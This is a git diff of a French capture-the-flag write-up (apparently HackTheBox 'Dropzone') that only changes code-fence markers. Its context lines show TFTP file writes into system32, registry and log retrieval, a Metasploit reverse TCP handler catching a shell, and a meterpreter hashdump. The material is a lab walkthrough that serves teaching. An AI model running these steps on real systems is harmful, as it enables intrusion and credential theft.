@@ -23,7 +23,7 @@ Reste à savoir quelle est la racine des fichiers pour le TFTP. Si on peut récu
 
 Qui plus est il semble que l'on dispose de droits privilégiés, en tout cas suffisants pour pouvoir placer un fichier dans system32 !  
 
-```plain
+```
 tftp> put testxx.txt windows/system32/testxx.txt
 Sent 6 bytes in 0.1 seconds
 tftp> get windows/system32/testxx.txt
@@ -43,7 +43,7 @@ Mais la vrai perle c'est bien sûr le *ntuser.dat* obtenu dans *C:\Documents and
 
 On trouve ainsi une info sur le serveur TFTP dans les MRU :  
 
-```plain
+```
 /Software/Microsoft/Windows/CurrentVersion/Explorer/ComDlg32/OpenSaveMRU/*/a,SZ,C:\Documents and Settings\Administrator\Desktop\SolarWinds-TFTP-Server.zip,
 /Software/Microsoft/Windows/CurrentVersion/Explorer/ComDlg32/OpenSaveMRU/*/b,SZ,C:\Documents and Settings\Administrator\Desktop\dotnetfx35.exe,
 /Software/Microsoft/Windows/CurrentVersion/Explorer/ComDlg32/OpenSaveMRU/exe/a,SZ,C:\Documents and Settings\Administrator\Desktop\dotnetfx35.exe,
@@ -52,13 +52,13 @@ On trouve ainsi une info sur le serveur TFTP dans les MRU :
 
 ainsi qu'une partie dans les *UserAssist* :  
 
-```plain
+```
 UEME_RUNPATH:C:\Documents and Settings\Administrator\Desktop\SolarWinds-TFTP-Server\SolarWindsTFTPServer.exe
 ```
 
 Il y a bien sûr les infos sur la version de l'OS dans *CurrentVersion* :  
 
-```plain
+```
 /Microsoft/Windows NT/CurrentVersion/ProductName,SZ,Microsoft Windows XP,
 /Microsoft/Windows NT/CurrentVersion/RegDone,SZ,,
 /Microsoft/Windows NT/CurrentVersion/RegisteredOrganization,SZ,Microsoft Corporation,
@@ -73,7 +73,7 @@ Il y a bien sûr les infos sur la version de l'OS dans *CurrentVersion* :
 
 On peut retrouver le nom de la machine (pas trop de surprise) via le fichier *netsetup.log* :  
 
-```plain
+```
 atftp -g -l netsetup.log -r "windows/debug/netsetup.log" 10.10.10.90
 05/09 17:20:20 NetpDoDomainJoin
 05/09 17:20:20 NetpMachineValidToJoin: 'DROPZONE'
@@ -90,7 +90,7 @@ atftp -g -l netsetup.log -r "windows/debug/netsetup.log" 10.10.10.90
 
 Enfin dans les documents récents on peut voir une entrée énigmatique... on y reviendra ;-)   
 
-```plain
+```
 /Software/Microsoft/Windows/CurrentVersion/Explorer/RecentDocs/7,BINARY,2%00 %00f%00o%00r%00 %00t%00h%00e%00 %00p%00r%00i%00c%00e%00 %00o%00f%00 %001%00!%00!%00!%00!%00%00%00|%002%00%00%00%00%00%00%00%00%00%00%002 for the price of 1!!!!.lnk%00%00P%00%03%00%04%00%EF%BE%00%00%00%00%00%00%00%00%14%00%00%002%00 %00f%00o%00r%00 %00t%00h%00e%00 %00p%00r%00i%00c%00e%00 %00o%00f%00 %001%00!%00!%00!%00!%00.%00l%00n%00k%00%00%00%2C%00%00%00,
 ```
 
@@ -117,7 +117,7 @@ Finalement il a fallut une fois de plus s'en remettre à Metasploit [qui possèd
 
 Il suffit d'extraire le code du MOF dans le module, remplacer les variables, retirer l'échappement des backslashs et après un test local pour valider on passe à l'action :)  
 
-```plain
+```
 msf exploit(multi/handler) > exploit
 
 [*] Started reverse TCP handler on 10.10.14.11:80
@@ -167,7 +167,7 @@ Il aura bien sûr fallut uploader au préalable l'utilitaire *streams.exe* pour 
 
 Et juste pour le plaisir :  
 
-```plain
+```
 meterpreter > run hashdump
 
 [!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
